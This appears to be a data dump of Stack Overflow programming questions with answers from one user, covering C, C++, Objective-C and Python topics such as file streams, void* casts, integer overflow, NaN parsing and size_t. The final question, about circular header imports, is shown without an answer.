"
"<p>If you have an application which relies on another app being installed, you ideally want your installer to find that dependency path automatically. On Windows you can use the registry but what about Mac/Linux? In this particular case it's a C++ application, if that makes a difference.</p>
","9530","","<p>In Mac OS X, if you're looking for an application that's bundled in a typical <code>.app</code> bundle, you can use Spotlight to find it from its bundle ID using the command line utility <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man1/mdfind.1.html"" rel=""nofollow""><code>mdfind(1)</code></a>.  For example, to find out if Firefox is installed (and where), run this command:</p>

<pre><code>mdfind 'kMDItemCFBundleIdentifier == org.mozilla.firefox'
</code></pre>
"
"<p>Is there some way to detect that a program was ended by windows task manager's ""end process""? 
I know that its kinda impossible to do that from within the application being ended (other than to build your app as a driver and hook ZwTerminateProcess), but I wonder if there is a way to notice it from outside. 
I don't want to stop the program from terminating, just to know that it was ended by ""end process"" (and not by any other way).</p>
","9530","","<p>Open up a handle to the process with <a href=""http://msdn.microsoft.com/en-us/library/ms684320%28v=vs.85%29.aspx"" rel=""nofollow""><code>OpenProcess</code></a>, and then wait on that handle using one of the wait functions such as <a href=""http://msdn.microsoft.com/en-us/library/ms687032%28v=vs.85%29.aspx"" rel=""nofollow""><code>WaitForSingleObject</code></a>.  You can get the exit status of the process using <a href=""http://msdn.microsoft.com/en-us/library/ms683189%28v=VS.85%29.aspx"" rel=""nofollow""><code>GetExitCodeProcess</code></a>.  If you need your program to remain responsive to user input while waiting, then make sure to wait on a separate thread (or you can periodically poll using a timeout of zero, but remember <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2006/01/24/516808.aspx"" rel=""nofollow"">the performance consequences of polling</a> -- not recommended).</p>

<p>When you're done, don't forget to call <a href=""http://msdn.microsoft.com/en-us/library/ms724211%28v=vs.85%29.aspx"" rel=""nofollow""><code>CloseHandle</code></a>.  The process object won't be fully deleted from the OS until all of its handles are closed, so you'll leak resources if you forget to call <code>CloseHandle</code>.</p>

<p>Note that there's no way to distinguish between a process exiting normally or being terminated forcefully.  Even if you have a convention that your program only ever exits with a status of 0 (success) or 1 (failure) normally, some other process could call <code>TerminateProcess(YourProcess, 1)</code>, and that would be indistinguishable from your ordinary failure mode.</p>
"
"<p>I am opening a file with <code>ifstream</code> to check if it exists. Then I close it and open it with <code>ofstream</code> to write to it, and I think setting <code>ios::trunc</code> flag allows me to overwrite it. </p>

<p>However I'd like the ability to keep the file open if it exists, but I used an <code>ifstream</code> to open it so does that mean I can't write to the file till I close and re-open using <code>fstream</code> or <code>ofstream</code>? I didn't use <code>fstream</code> to begin with because that wouldn't tell me if the file was already there or not. </p>
","9530","","<p>Just open a read-write <code>fstream</code> on the file.  You can test if the file previously existed (and was non-empty) by seeking to the end and seeing if you're at a non-zero offset.  If so, the file existed, and you can do whatever with it.  If not, the file didn't exist or was empty.  Assuming you don't need to distinguish between those two cases, you can then proceed as if it did not exist.</p>

<p>For example:</p>

<pre><code>// Error checking omitted for expository purposes
std::fstream f(""file.txt"", std::ios::in | std::ios::out);
f.seekg(0, std::ios::end)
bool didFileExist = (f.tellg() &gt; 0);
f.seekg(0, std::ios::beg);

// Now use the file in read-write mode.  If didFileExist is true, then the
// file previously existed (and has not yet been modified)
</code></pre>
"
"<p>I was just playing with the iOS sample code of the facebook sdk, however I am seeing a screen like this when I login:</p>

<p><img src=""http://i.stack.imgur.com/jzOEb.png"" alt=""enter image description here""></p>

<p>Now usually in other apps, I don't see the web address and the search bar. I only see facebook in the tab bar. So how can I achieve the same thing?</p>
","9530","","<p>When you ask the Facebook API to authenticate the user, it will try to launch the Facebook app if it's installed; if not, it launches Safari instead.  Since you don't have the FB app installed on the simulator, it's launching Safari on the simulator.</p>

<p>If you test on a device instead that has the FB app, then you'll see it launch that as expected.</p>
"
"<p>When generating am xml in C by using fprintf(), what should be kept in mind?
I am using it, but i am facing some issues when opening the xml in IE; however, in any editor, it shows proper contents.</p>

<p><strong>Code</strong></p>

<pre><code>int WriteXmlElement(const char* filename, const char* element, int iTextAssociated)
{
   FILE *fp = NULL;

   fp = fopen(filename, ""a+"");
   if(fp != NULL)
   {
      fprintf(fp, ""&lt;%s&gt;\n"",element);
      fprintf(fp,""&lt;/%s&gt;\n"" , element);

      fclose(fp);
      return 0;
   }
   else 
      return -1;

}
</code></pre>

<p><strong>XML in IE</strong></p>

<pre><code>&lt;?xml version=""1.0"" encoding=""UTF-8"" ?&gt; 
&lt;Group /&gt; 
</code></pre>

<p><strong>XML in any editor</strong></p>

<pre><code>&lt;?xml version=""1.0"" encoding=""UTF-8"" ?&gt; 
&lt;Group&gt; &lt;/Group&gt;
</code></pre>
","9530","","<p>The XML is being generated just fine.  Internet Explorer is choosing to reinterpret it by automatically refactoring empty tags of the form <code>&lt;foo&gt;&lt;/foo&gt;</code> into just <code>&lt;foo/&gt;</code> for display purposes (it does not modify the file on disk).  If you want to be sure that the XML file you're generating has the proper contents, just look at it in a regular text editor instead of IE.</p>
"
"<p>i'm developing an app that uses Box2d. When I try to do something like this :</p>

<pre><code>NSString *s = @""wood"";

bodyDef.userData.name = s; 
</code></pre>

<p>I get error </p>

<pre><code>request for member 'name' in 'bodyDef.b2BodyDef::userData', which is of non-class type 'void*'
</code></pre>

<p>Thanks!</p>
","9530","","<p>You cannot dereference a <code>void*</code> pointer in C, C++, or Objective-C.  A <code>void*</code> pointer is a pointer to an unknown data type -- when you use one, you're telling the compiler that ""it points to <em>something</em>, but I have no idea what exactly that something is"".</p>

<p>When you assign your user data to a Box2D object, it treats it as an opaque pointer: it copies it around as needed, but it never looks at what data the pointer points to.  That's your job.</p>

<p>In order to get a usable pointer back out, you just need to cast it (implicitly or explicitly) to the correct type.  Assuming you're using a common data structure, you can do something like this:</p>

<pre><code>struct MyUserData
{
    NSString *name;
    // other data
};
...
// Allocate and initialize the user data
MyUserData *userData = malloc(sizeof(MyUserData);
userData-&gt;name = @""wood"";
// etc.
bodyDef.userData = userData;

...

// To access the data, use an explicit cast or an implicit cast:
NSString *name = ((MyUserData *)bodyDef.userData)-&gt;name;  // explicit

MyUserData *userData = bodyDef.userData;  // implicit
NSString *name = userData-&gt;name;
</code></pre>

<p>Note that you can only make an implicit cast from <code>void*</code> to other pointer types in C and Objective-C -- doing so is illegal in C++ and Objective-C++ and requires an explicit cast.</p>
"
"<p>I'm trying to execute the following code and get the error above. What exactly is the error saying? I'm definitely passing it an int...(<code>aid</code> is the <code>int</code> arg).</p>

<pre><code>spam_contacts = get_spam_contacts(aid, conn)
</code></pre>
","9530","","<p>Look at the stack trace printed before the error message.  Somewhere, somebody is calling the <a href=""http://docs.python.org/library/functions.html#int"" rel=""nofollow""><code>int()</code></a> function to convert a value to an integer.  The only values you're allowed to pass to <code>int</code> are strings and numbers (as well as user-defined classes that define integer conversion, but that's beside the point) -- you cannot pass a tuple to <code>int()</code>.</p>

<p>Figure out where your tuple is coming from and replace it with something more appropriate.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/990817/objective-c-ints-always-initialized-to-0"">(Objective-)C ints always initialized to 0?</a>  </p>
</blockquote>



<p>I have an interface</p>

<pre><code>@interface MyInterface
{
   NSInteger _count;
}

@end
</code></pre>

<p>Then in my implementation I am just using is as</p>

<pre><code>if (_count==0)
{
  //do somthing
}
_count++;
</code></pre>

<p>And it works i.e. the first time around when this is executed the value is in fact 0 even though I never initialized it to be zero.</p>

<p>Is it because the default value of NSInteger is 0? </p>
","9530","","<p>Assuming you meant to write <code>==</code> instead of <code>=</code>, the answer is that all of the instance variables (ivars) of an Objective-C class get initialized to 0 or <code>nil</code> when the object gets created.  See the question <a href=""http://stackoverflow.com/questions/990817/objective-c-ints-always-initialized-to-0"">(Objective-)C ints always initialized to 0?</a>.</p>

<p>If you actually wrote <code>if (_count = 0)</code> with a single <code>=</code>, then that's not doing what you expected -- it's assigning 0 to <code>_count</code>, and then testing if it's non-zero (the expression <code>if (x)</code> tests if <code>x</code> is non-zero).  Since you just assigned 0 to it, it's not non-zero, so the test will always fail.</p>
"
"<p>I use Eclipse CDT - Cross G++ Complier (MinGW/msys) on Windows 7, this is my code:</p>

<pre><code>int64_t y = 1024 * 1024 * 1024 * 4;
std::cout &lt;&lt; ""type id: "" &lt;&lt; typeid(y).name() &lt;&lt; ""; value: "" &lt;&lt; y &lt;&lt; ""; size of y: "" &lt;&lt; sizeof(y) &lt;&lt; std::endl;
</code></pre>

<p>(The IDE warning: ""Integer overflow"".)</p>

<p>And output is:</p>

<pre><code>""type id: x; value: 0; size of y: 8""
</code></pre>

<p>I dont understand, why size of y is 8 bytes but value is 0.</p>

<p>Thanks for your help.</p>
","9530","","<p>The fact that you're assigning the result to an <code>int64_t</code> is irrelevant.  All that matters is that when you multiply two values of type <code>int</code>, the result also has type <code>int</code>.  Since all of 1024, 1024, 1024, and 4 are constants of type <code>int</code>, the resulting temporary product is computed as an <code>int</code>, which overflows.</p>

<p>The solution is to make at least one of those constants an <code>int64_t</code>.  The product of an <code>int64_t</code> with an <code>int</code> is an <code>int64_t</code>, so the 64-bitness will cascade through the entire product.  You can do this either with an explicit cast or an <em>integer suffix</em>:</p>

<pre><code>int64_t y = (int64_t)1024 * 1024 * 1024 * 4;  // explicit cast
int64_t y = 1024ll * 1024 * 1024 * 4;  // integer suffix 'll'
</code></pre>

<p>The suffix <code>ll</code> (or equivalently <code>LL</code>) after an integer constant says ""this value is really a <code>long long</code>"".  There's also the <code>ull</code> (or <code>ULL</code>) suffix, which is used for <code>unsigned long long</code>.  Also note that the C language standard guarantees that a <code>long long</code> is at least 64 bits.</p>
"
"<p>I am very new to LaunchD programming. I need to develop an application which needs to run in the background always. One of my friend suggest me that LaunchD programming is better for your requirement.I don't know how to use LaunchD programming. Can you guys suggest a best document or a sample code, to work on this?</p>

<p>Thanks in advance,
Chandra.</p>
","9530","","<p><a href=""http://developer.apple.com/library/mac/#technotes/tn2083/_index.html"" rel=""nofollow"">Technical Note TN2083</a> has a comprehensive description of daemons and background programs in Mac OS X.  Give that document a thorough read-through, and then come back with any further questions.</p>
"
"<p>I have a IPhone project and I need to change some code in it. The problem is: this project doesn't have any .m file. I have all header files (.h) and some nib files. I found a .a(?) file and when I took a look in it, it had some code inside, aparently it's some kind of compilated file. Is there any way to de-compile this file?</p>

<p>Regards!</p>
","9530","","<p>A <code>.a</code> file is a compiled static library file (aka <em>archive</em>).  It does not contain any source code, only object code for one or more architectures.</p>

<p>What exactly do you need to change?  What are you trying to achieve?  There's almost certainly a better way to do it.  You can use <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/Manpages/man1/ar.1.html"" rel=""nofollow""><code>ar(1)</code></a> utility to manipulate archive files, such as by extracting or replacing object files, but I strongly recommend against that unless you really know what you're doing.</p>
"
"<p>I want to read and write NaN values from/into text files using iostream and Visual C++. When writing a NaN value, i get <code>1.#QNAN</code>. But, reading it back outputs <code>1.0</code> .</p>

<pre><code>float nan = std::numeric_limits&lt;float&gt;::quiet_NaN ();
std::ofstream os(""output.txt"");

os &lt;&lt; nan ;
os.close();
</code></pre>

<p>The output is <code>1.#QNAN</code> .</p>

<pre><code>std::ifstream is(""output.txt"");
is &gt;&gt; nan ;
is.close();
</code></pre>

<p><code>nan</code> equals <code>1.0</code>.</p>

<p><strong>Solution</strong></p>

<p>Finally, as suggested by awoodland, I've come up with this solution. I chose ""nan"" as a string representation of a NaN. Both &lt;&lt; and >> operators are overridden.</p>

<pre><code>using namespace ::std;

class NaNStream 
{
public:
  NaNStream(ostream&amp; _out, istream&amp; _in):out(_out), in(_in){}
  template&lt;typename T&gt;
  const NaNStream&amp; operator&lt;&lt;(const T&amp; v) const {out &lt;&lt; v;return *this;}
  template&lt;typename T&gt;
  const NaNStream&amp; operator&gt;&gt;(T&amp; v) const {in &gt;&gt; v;return *this;}
protected:
  ostream&amp; out;
  istream&amp; in;
};

// override &lt;&lt; operator for float type
template &lt;&gt; const NaNStream&amp; NaNStream::operator&lt;&lt;(const float&amp; v) const 
{
  // test whether v is NaN 
  if( v == v )
    out &lt;&lt; v;
  else
    out &lt;&lt; ""nan"";
  return *this;
}

// override &gt;&gt; operator for float type
template &lt;&gt; const NaNStream&amp; NaNStream::operator&gt;&gt;(float&amp; v) const 
{
  if (in &gt;&gt; v)
    return *this;

  in.clear();
  std::string str;
  if (!(in &gt;&gt; str))
    return *this;

  if (str == ""nan"")
    v = std::numeric_limits&lt;float&gt;::quiet_NaN();
  else
    in.setstate(std::ios::badbit); // Whoops, we've still ""stolen"" the string

  return *this;
}
</code></pre>

<p>A minimal working example: a finite float and a NaN are written into a stringstream and then read back.</p>

<pre><code>int main(int,char**) 
{
  std::stringstream ss;
  NaNStream nis(ss, ss);
  nis &lt;&lt; 1.5f &lt;&lt; std::numeric_limits&lt;float&gt;::quiet_NaN ();
  std::cout &lt;&lt; ss.str() &lt;&lt; std::endl; // OUTPUT : ""1.5nan""

  float a, b;
  nis &gt;&gt; a;  nis &gt;&gt; b;
  std::cout &lt;&lt; a &lt;&lt; b &lt;&lt; std::endl;  // OUTPUT : ""1.51.#QNAN""
}
</code></pre>
","9530","","<p>When printing a <code>float</code> or <code>double</code> value to a <code>std::ostream</code>, the class template <code>std::num_put&lt;&gt;</code> is used (C++03 §22.2.2.2).  It formats the value as if printed by <code>printf</code> with one of the <code>%e</code>, <code>%E,</code> <code>%f</code>, <code>%g</code>, or <code>%G</code> format specifiers, depending on the stream's flags (Table 58).</p>

<p>Likewise, when inputting a <code>float</code> or <code>double</code> value, it reads it as if with the <code>scanf</code> function with a format specifier of <code>%g</code> (§22.2.2.1.2/5).</p>

<p>So, the next question is why <code>scanf</code> does not properly parse <code>1.#QNAN</code>.  The C89 standard does not mention NaNs in its descriptions of both the <code>fprintf</code> and <code>fscanf</code> functions.  It does say that the representation of floating-point numbers is unspecified, so this falls unspecified behavior.</p>

<p>C99, on the other hand, does specify the behavior here.  For <code>fprintf</code> (C99 §7.19.6.1/8):</p>

<blockquote>
  <p>A <code>double</code> argument representing an infinity is converted in one of the styles
  <code>[-]inf</code> or <code>[-]infinity</code> — which style is implementation-defined. A
  <code>double</code> argument representing a NaN is converted in one of the styles
  <code>[-]nan</code> or <code>[-]nan(<em>n-char-sequence</em>)</code> — which style, and the meaning of
  any <em>n-char-sequence</em>, is implementation-defined. The F conversion specifier
  produces <code>INF</code>, <code>INFINITY</code>, or <code>NAN</code> instead of <code>inf</code>, <code>infinity</code>, or <code>nan</code>,
  respectively.<sup>243)</sup></p>
</blockquote>

<p><code>fscanf</code> is specified to parse the number according to <a href=""http://linux.die.net/man/3/strtod""><code>strtod(3)</code></a> (C99 §7.19.6.2/12).  <code>strtod</code> parses as follows (§7.20.1.3/3):</p>

<blockquote>
  <p>The expected form of the subject sequence is an optional plus or minus sign, then one of
  the following:<br>
  — a nonempty sequence of decimal digits optionally containing a decimal-point
  character, then an optional exponent part as defined in 6.4.4.2;<br>
  — a <code>0x</code> or <code>0X</code>, then a nonempty sequence of hexadecimal digits optionally containing a
  decimal-point character, then an optional binary exponent part as defined in 6.4.4.2;<br>
  — <code>INF</code> or <code>INFINITY</code>, ignoring case<br>
  — <code>NAN</code> or <code>NAN(<em>n-char-sequence<sub>opt</sub></em>)</code>, ignoring case in the NAN part, where:<pre>
n-char-sequence:
    digit
    nondigit
    n-char-sequence digit
    n-char-sequence nondigit
</pre>
  The subject sequence is defined as the longest initial subsequence of the input string,
  starting with the first non-white-space character, that is of the expected form. The subject
  sequence contains no characters if the input string is not of the expected form.</p>
</blockquote>

<hr>

<p>So, after taking all that in, the end result is that your C standard library is not C99-compliant, since <code>1.#QNAN</code> is not a valid output of <code>fprintf</code> according to the above.  But, it's well-known that Microsoft's C runtime is not C99-compliant, and it doesn't plan to become compliant any time soon, as far as I'm aware.  Since C89 does not specify the behavior here with respect to NaNs, you're out of luck.</p>

<p>You could try switching to a different compiler and C runtime (such as Cygwin+GCC), but that's an awfully big hammer for such a small nail.  If you really need this behavior, I'd recommend writing a wrapper class for floats that is capable of correctly formatting and parsing NaN values.</p>
"
"<p>I have a bunch of <code>.cpp</code> files which together process similar data files but of various sizes. For the larger data files I want to do some timing studies on the functions inside the .cpp files. </p>

<p>I would like to suppress the output the results for these big data sets, and only print the timing results. For smaller data sets, I would like to print to the screen  to verify algorithm/code correctness. </p>

<p>Rather than repeatedly commenting/uncommenting out the appropriate <code>cout</code> statements and recompiling ,  I would like to use command line arguments (or some other technique) to selectively suppress output. </p>

<p>Any suggestions? The naive one I can think of is use <code>argc</code> and <code>argv</code>, but I am not sure if they are global variables which can be used by functions across different files. </p>
","9530","","<p>Your intuition is correct -- use the <code>argc</code> and <code>argv</code> values passed into your <code>main</code> function -- but they are not global variables.  You need to make your information global somehow: I'd recommend parsing the arguments once, and keeping a set of global flags that can easily be queried.</p>

<p>For example:</p>

<pre><code>// In a common header file that gets included in each source file
extern bool g_bFlag1;
extern bool g_bFlag2;
...

// In your main source file
bool g_bFlag1 = false;
bool g_bFlag2 = false;
...
int main(int argc, char **argv)
{
    // Parse command line and store results in global flags
    for (int i = 1; i &lt; argc; i++)
    {
        if (strcmp(argv[i], ""--flag1"") == 0)
            g_bFlag1 = true;
        else if (strcmp(argv[i], ""--flag2"") == 0)
            g_bFlag2 = true;
        else
            ;  // etc.
    }
}

// In any other source file:
if (g_bFlag1)
{
    // do stuff if and only if g_bFlag1 is set
}
</code></pre>

<p>Then you can pass <code>--flag1</code> on the command line.  For more complicated argument parsing, I'd suggest using a library such as <a href=""http://www.gnu.org/s/hello/manual/libc/Getopt.html"" rel=""nofollow"">GNU getopt</a>.</p>
"
"<p>In Windows, I have an application that needs to set the access control to the user/group 'Everybody' only. And sets permissions to Read-Only. Under Linux a Simple <code>open()</code> call with octal <code>004</code> permissions is sufficient. On Windows, how do I accomplish the same thing? Preferably in the call to <code>CreateFile()</code>.</p>
","9530","","<p>Create a <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa379561%28v=vs.85%29.aspx"" rel=""nofollow""><code>SECURITY_DESCRIPTOR</code></a> with the proper attributes.  The functions linked to from there are a good starting point for creating the proper security descriptor (it's far from trivial).  <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa446595%28v=vs.85%29.aspx"" rel=""nofollow"">This page</a> shows a good example of creating one, including how to get the SID for the ""Everybody"" group (<code>pEveryoneSID</code> in the code).</p>

<p>Then, just pass in that security descriptor to <code>CreateFile</code> as the <code>lpSecurityAttributes</code> parameter.</p>
"
"<p>I'm new to Objective C, and I'm trying to call a method on an array (NSArray) of objects directly like this:</p>

<pre><code>[[myPeople objectAtIndex: 0] setName: @""Shane""];
</code></pre>

<p>But this doesn't seem to work, and returns a warning saying ""Multiple methods named 'setName' found""</p>

<p>I can successfully perform the operation in this manner:</p>

<pre><code>Person* person = [myPeople objectAtIndex: 0];
[person setName: @""Shane""];
</code></pre>

<p>Is my syntax simply incorrect in the first case, or should the second piece of code be used? Or is there a better way that I'm not aware of?</p>

<p>Thanks, any help is greatly appreciated</p>
","9530","","<p>The first syntax is correct and will work correctly, despite the warning.  The compiler is warning you because it can't verify the type of object that you're calling <code>setName:</code> on.</p>

<p>The method <code>objectAtIndex:</code> of the <code>NSArray</code> class returns the type <code>id</code>, which is a generic pointer to an Objective-C object of unknown type.  So, when you call <code>setName:</code> on the <code>id</code> that is returned, the compiler doesn't know what the actual class of the object is.  In your code, there are multiple classes that define the <code>setName:</code> method (possibly as a synthesized setter for a property named <code>name</code>), so it issues a warning.</p>

<p>The second code snippet compiles without warning because the <code>id</code> type can be implicitly cast to any other Objective-C pointer type.  When you say <code>Person* person = [myPeople objectAtIndex: 0];</code>, you're taking the <code>id</code> returned by <code>objectAtIndex:</code> and casting it (implicitly) to <code>Person*</code>.  Then, when you call <code>setName:</code> on that <code>Person</code>, the compiler knows what type you have, so it can verify that the class <code>Person</code> does in fact implement the <code>setName:</code> method.</p>
"
"<p>I am trying to execute a program from within a C program (inside UNIX).</p>

<p>I have been given an executable ( the program requires a string input during execution and writes that input to another file called sample ) called exec and I want to execute it in program.c, but giving the string input through indirection.</p>

<p>For that I created a file as follows:</p>

<pre><code>% vim input
</code></pre>

<p>I wrote the following inside the input file</p>

<pre><code>content
</code></pre>

<p>Now in program.c,</p>

<pre><code>#include&lt;unistd.h&gt;
int main()
{
      const char* command = ""./exec &lt; input"";
      execvp(command, NULL);
      return 0;
}
</code></pre>

<p>When I run the program, the content is not entered into the sample file.</p>

<p>But when I run it without indirection, i.e.</p>

<pre><code>const char* command = ""./exec"";
</code></pre>

<p>then it works, and input entered in saved in sample file.</p>

<p>Can someone please tell what am I doing wrong in the indirection syntax.</p>

<p>Thanks.</p>
","9530","","<p>The <a href=""http://linux.die.net/man/3/exec"" rel=""nofollow""><code>exec(3)</code></a> family of functions does not know anything about input redirection or parsing command lines: it tries to execute exactly the executable you give it.  It's trying to search for an executable file with the name <code>""./exec &lt; input""</code>, which unsurprisingly does not exist.</p>

<p>One solution would be to use the <a href=""http://linux.die.net/man/3/system"" rel=""nofollow""><code>system(3)</code></a> function instead of <code>exec</code>.  <code>system</code> invokes the user's shell (such as <code>/bin/bash</code>), which is capable of parsing the command line and doing appropriate redirections.  But, <code>system()</code> is not as versatile as <code>exec</code>, so it may or may not be suitable for your needs.</p>

<p>The better solution is to do the input redirection yourself.  What you need to do us use <a href=""http://linux.die.net/man/3/open"" rel=""nofollow""><code>open(3)</code></a> to open the file and <a href=""http://linux.die.net/man/3/dup2"" rel=""nofollow""><code>dup2(3)</code></a> to duplicate the file descriptor onto file descriptor 0 (standard input), and then <code>exec</code> the executable.</p>
"
"<p>Consider the following code sample:</p>

<pre><code>int i1 = 'w\""';
int i2 = '\w\""';
int i3 = 'w""';
int i4 = 'w\""';
</code></pre>

<p>Note: MSVS SP1 2005 C++ compiler, just default debug compilation/linkage settings. x86 machine. The compiler outputs warning C4129: 'w' : unrecognized character escape sequence and everything else is just fine.</p>

<p>The raw memory representation of the given variables are as follows:</p>

<pre><code>i1 -&gt; 22 77 00 00
i2 -&gt; 77 22 00 00
i3 -&gt; 22 77 00 00
i4 -&gt; 22 77 00 00
</code></pre>

<p>Why i2 has reverse order? Whats going on??</p>
","9530","","<p>It's a bug in the compiler.  I suggest you file a bug on <a href=""http://connect.microsoft.com/"" rel=""nofollow"">Microsoft Connect</a> (though I wouldn't bet on them fixing it any time soon).  It also occurs with real escape sequences such as <code>\n</code> or <code>\x6e</code>, so it has nothing to do with the invalid escape sequence <code>\w</code>.</p>

<p>In VS 2008 and VS 2010, the output of this program:</p>

<pre><code>#include &lt;stdio.h&gt;

int main(void)
{
    int x[] = {'abn""', 'abn\""', 'ab\x6e""', 'ab\x6e\""'};
    for (int i = 0; i &lt; sizeof(x)/sizeof(x[0]); i++)
        printf(""%08x\n"", x[i]);

    return 0;
}
</code></pre>

<p>is this:</p>

<pre><code>61626e22
61626e22
61626e22
2261626e
</code></pre>

<p>This shows that for some strange reason, the compiler moves the quotation mark (the 22) to the beginning of the multicharacter character constant, but only when it's escaped and when the constant has another escaped character in it.</p>
"
"<p>I've been looking all over the net for a good, quick solution to this, and haven't found anything that has satisfied me yet. It seems like it should be trivial--just one or two calls to a function in some library and that's it--but that doesn't seem to be the case. libjpeg and libtiff lack good documentation and the solutions people have posted involve understanding how the image is produced and writing ~50 lines of code. How would you guys do this in C++?</p>
","9530","","<p>The easiest way is to save it as a <a href=""http://en.wikipedia.org/wiki/Netpbm_format"" rel=""nofollow"">Netpbm image</a>.  Assuming that your array is packed into 24 bits per pixel with no padding between pixels, then you can write out a super-simple header followed by the binary data.  For example:</p>

<pre><code>void save_netpbm(const uint8_t *pixel_data, int width, int height, const char *filename)
{
    // Error checking omitted for expository purposes
    FILE *fout = fopen(filename, ""wb"");

    fprintf(fout, ""P6\n%d %d\n255\n"", width, height);
    fwrite(pixel_data, 1, width * height * 3, fout);

    fclose(fout);
}
</code></pre>
"
"<p>I have a API like this,</p>

<pre><code>class IoType {
......
    StatusType writeBytes(......, size_t&amp; bytesWritten);
    StatusType writeObjects(......, size_t&amp; objsWritten);
};
</code></pre>

<p>A senior member of the team who I respect seems to have a problem with the type size_t and suggest that I use C99 types. I know it sounds stupid but I always think c99 types like uint32_t and uint64_t look ugly. I do use them but only when it's really necessary, for instance when I need to serialize/deserialize a structure, I do want to be specific about the sizes of my data members.</p>

<p>What are the arguments against using size_t? I know it's not a real type but if I know for sure even a 32-bit integer is enough for me and a size type seems to be appropriate for number of bytes or number of objects, etc.</p>
","9530","","<p>Use exact-size types like <code>uint32_t</code> whenever you're dealing with serialization of any sort (binary files, networking, etc.).  Use <code>size_t</code> whenever you're dealing with the size of an object in memory—that's what it's intended for.  All of the functions that deal with object sizes, like <code>malloc</code>, <code>strlen</code>, and the <code>sizeof</code> operator all <code>size_t</code>.</p>

<p>If you use <code>size_t</code> correctly, your program will be maximally portable, and it will not waste time and memory on platforms where it doesn't need to.  On 32-bit platforms, a <code>size_t</code> will be 32 bits—if you instead used a <code>uint64_t</code>, you'd waste time and space.  Conversely, on 64-bit platforms, a <code>size_t</code> will be 64 bits—if you instead used a <code>uint32_t</code>, your program could behave incorrectly (maybe even crash or open up a security vulnerability) if it ever had to deal with a piece of memory larger than 4 GB.</p>
"
"<p>Im trying to get my data retrieved from a socket into a nsmutablearray.  however the examples and tutorials i found showed it going into a string first.  which is fine i can parse it out from there.  but i cant even get this string thing working.</p>

<pre><code>    case NSStreamEventHasBytesAvailable:
    {

        if(!rawData) {
            rawData = [[NSMutableData data] retain];
        }
        uint8_t buf[1024];
        unsigned int len = 0;
        len = [(NSInputStream *)theStream read:buf maxLength:1024];
        if(len) {
         [rawData initWithBytes:buf length:len];
            int bytesRead;
            bytesRead += len;

            [self messageReceived:rawData];

        } else {
            NSLog(@""no buffer!"");
        }
        NSString *str = [[NSString alloc] initWithData:rawData 
                                              encoding:NSUTF8StringEncoding];
        NSLog(@""data buffer: %@ |~|string buffer%@"",rawData,str);


        [str release];
        break;
    }
</code></pre>

<p>But as you will see from the output below the string never gets any of the data (well actually i think its an encoding problem, and so i think it just looks empty)</p>

<blockquote>
  <p>2011-09-27 13:14:06.356 Cameleon[30095:207] data buffer: &lt;0f000102>
  |~|string buffer</p>
  
  <p>2011-09-27 13:14:06.359 Cameleon[30095:207] data buffer: &lt;02000400
  000003> |~|string buffer</p>
  
  <p>2011-09-27 13:14:06.458 Cameleon[30095:207] data buffer: &lt;05000500
  00020300> |~|string buffer</p>
  
  <p>2011-09-27 13:14:06.659 Cameleon[30095:207] data buffer: &lt;05000b00
  0008080e 13163809 2711> |~|string buffer</p>
  
  <p>2011-09-27 13:14:06.663 Cameleon[30095:207] data buffer: &lt;05000700
  00040101 005a> |~|string buffer</p>
</blockquote>

<p>i want the string buffer to mirror the values of the databuffer
or an array with each byte of the data buffer</p>

<p>ANSWER:</p>

<pre><code>case NSStreamEventHasBytesAvailable:
        {

            if(!rawData) {
                rawData = [[NSMutableData data] retain];
            }
            uint8_t buf[1024];
            unsigned int len = 0;
            len = [(NSInputStream *)theStream read:buf maxLength:1024];
            if(len) {
             [rawData initWithBytes:buf length:len];                
            } else {
                NSLog(@""no buffer!"");
            }

            const uint8_t *bytes = [rawData bytes];

            NSMutableArray *mutableBuffer = [[NSMutableArray alloc] initWithCapacity:len];  

            for (int i =0; i &lt; [rawData length]; i++) {
                [mutableBuffer addObject:[NSString stringWithFormat:@""%02X"", bytes[i]]];
            }
            [self gateKeeper:mutableBuffer];


            [mutableBuffer release];
            break;
</code></pre>
","9530","","<p>Your code has several problems.  First off, this is not the usual pattern for allocating an <code>NSData</code> object:</p>

<pre><code>rawData = [[NSMutableData data] retain];
</code></pre>

<p>Although technically correct in terms of memory management, it's non-idiomatic and results in an unnecessary pair of <code>autorelease</code> and <code>retain</code> messages getting sent.  It should instead be this:</p>

<pre><code>rawData = [[NSMutableData alloc] init];
</code></pre>

<p>Secondly, this code is useless:</p>

<pre><code>int bytesRead;
bytesRead += len;
</code></pre>

<p>You're declaring a variable, failing to initialize it, adding <code>len</code> to it (which is technically Undefined Behavior, but on x86 this will be harmless), and then doing nothing with it.  You probably want to use a longer-lived variable declared outside of this block and initialize it properly.</p>

<p>Finally, the actual cause of your problem is that the data you're receiving is not UTF-8 text.  It's some kind of binary data with embedded NUL characters (the zero bytes).  When these get converted to strings, the NULs signal termination of the string, so nothing after them gets printed.</p>

<p>Just keep the data you have as an <code>NSData</code>, don't bother trying to convert it to a string if it's not actually textual data.  What sort of data are you dealing with?  Where is it coming from?</p>
"
"<p>I have code like</p>

<pre><code>#define ONE 1
#define TWO 2
#define SUM (ONE+TWO)
</code></pre>

<p>How do I dump SUM as ""3"", the resolved value, in gcc 4.3+?</p>

<p><code>gcc -dM -E foo.h</code> only seems to dump it as is. How do I get the actual value like it's inserted on compilation stage?</p>
","9530","","<p>You can't.  As far as the compiler is concerned, the line <code>printf(""%d\n"", SUM)</code> before preprocessing is indistinguishable from the line <code>printf(""%d\n"", 1+2)</code>.  The compiler just happens to perform an optimization called <a href=""http://en.wikipedia.org/wiki/Constant_folding"" rel=""nofollow"">constant folding</a>, even at the default optimization level (<code>-O0</code>), which turns the result into a constant 3 at runtime.</p>

<p>There's not really a good way to see the output of these optimizations.  You could use the <code>-S</code> option to view the generated assembly code and see what that looks like, but if your program is anything larger than a toy, that will be a lot of manual effort.  You could also look at the parse tree by using one of the <code>-fdump-tree</code> options (see the GCC man page).</p>
"
"<p>I get an error when I try and import corresponding files.</p>

<p>i.e.</p>

<p>UIViewController ""VC.h"" Imports ""CustomObject.h""</p>

<p>CustomObject Imports ""VC.h""</p>

<p>Starts giving error expected specifier qualifier list before </p>

<p>Any ideas? I want both objects to be able to call each other.</p>

